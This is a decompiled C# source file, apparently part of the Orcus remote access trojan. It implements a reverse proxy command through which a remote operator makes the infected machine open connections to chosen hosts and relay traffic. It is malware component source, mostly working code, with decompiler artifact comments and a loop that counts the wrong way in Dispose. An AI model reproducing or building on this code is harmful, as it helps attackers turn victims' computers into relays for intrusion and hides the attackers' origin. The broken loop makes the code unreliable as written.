using System;
using System.Collections.Generic;
using System.Linq;
using Orcus.Commands.ReverseProxy.Args;
using Orcus.Plugins;
using Orcus.Shared.Commands.ReverseProxy;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.ReverseProxy;

[DisallowMultipleThreads]
public class ReverseProxyCommand : Command
{
	private List<ReverseProxyClient> _proxyClients;

	private IConnectionInfo _connection;

	private bool _isDisposed;

	public override void Dispose()
	{
		((Command)this).Dispose();
		_isDisposed = true;
		if (_proxyClients != null)
		{
			for (int i = _proxyClients.Count - 1; i >= 0; i++)
			{
				_proxyClients[i].Disconnect();
			}
		}
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected I4, but got Unknown
		_connection = connectionInfo;
		ReverseProxyCommunication val = (ReverseProxyCommunication)parameter[0];
		int connectionId;
		switch ((int)val)
		{
		default:
			throw new ArgumentOutOfRangeException();
		case 0:
		{
			if (_proxyClients == null)
			{
				_proxyClients = new List<ReverseProxyClient>();
			}
			ReverseProxyConnect val2 = Serializer.FastDeserialize<ReverseProxyConnect>(parameter, 1);
			ReverseProxyClient reverseProxyClient = new ReverseProxyClient(val2.get_Target(), val2.get_Port(), val2.get_ConnectionId());
			reverseProxyClient.DataReceived += ReverseProxyClientOnDataReceived;
			reverseProxyClient.Disconnected += ReverseProxyClientOnDisconnected;
			reverseProxyClient.ResponseStatusUpdate += ReverseProxyClientOnResponseStatusUpdate;
			reverseProxyClient.Initialize();
			_proxyClients.Add(reverseProxyClient);
			break;
		}
		case 1:
			connectionId = BitConverter.ToInt32(parameter, 1);
			_proxyClients.FirstOrDefault((ReverseProxyClient x) => x.ConnectionId == connectionId)?.SendToTargetServer(parameter, 5, parameter.Length - 5);
			break;
		case 2:
			connectionId = BitConverter.ToInt32(parameter, 1);
			_proxyClients.FirstOrDefault((ReverseProxyClient x) => x.ConnectionId == connectionId)?.Disconnect();
			break;
		}
	}

	private void ReverseProxyClientOnResponseStatusUpdate(object sender, ReverseProxyStatusUpdatedEventArgs e)
	{
		if (!_isDisposed)
		{
			((Command)this).ResponseBytes((byte)3, Serializer.FastSerialize<ReverseProxyStatusUpdate>(e.ToStatusUpdate()), _connection);
		}
	}

	private void ReverseProxyClientOnDisconnected(object sender, ReverseProxyEventArgs e)
	{
		if (!_isDisposed)
		{
			((Command)this).ResponseBytes((byte)5, BitConverter.GetBytes(e.ConnectionId), _connection);
			_proxyClients.Remove((ReverseProxyClient)sender);
		}
	}

	private void ReverseProxyClientOnDataReceived(object sender, ReverseProxyDataReceivedEventArgs e)
	{
		if (!_isDisposed)
		{
			byte[] array = new byte[5 + e.Data.Length];
			array[0] = 4;
			Buffer.BlockCopy(BitConverter.GetBytes(e.ConnectionId), 0, array, 1, 4);
			Buffer.BlockCopy(e.Data, 0, array, 5, e.Data.Length);
			_connection.CommandResponse((Command)(object)this, array, (PackageCompression)0);
		}
	}

	protected override uint GetId()
	{
		return 15u;
	}
}
